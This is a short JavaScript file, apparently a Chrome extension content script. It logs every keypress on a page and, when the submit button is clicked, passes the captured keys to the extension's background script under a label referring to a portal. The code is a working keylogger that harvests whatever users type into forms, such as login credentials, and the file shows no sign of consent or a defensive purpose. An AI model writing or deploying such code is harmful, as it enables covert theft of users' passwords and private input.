var keyPressed = [];
var submitBtn = document.querySelector('button[type=submit]');

document.addEventListener('keypress', function(e){
  keyPressed.push(e.key);
});

submitBtn.addEventListener('click', function(e) {
  console.log("Clicked");
  // pass data to background script
  chrome.runtime.sendMessage({"aiub_portal_data": keyPressed}, function(response) {
    console.log(response);
  });
});
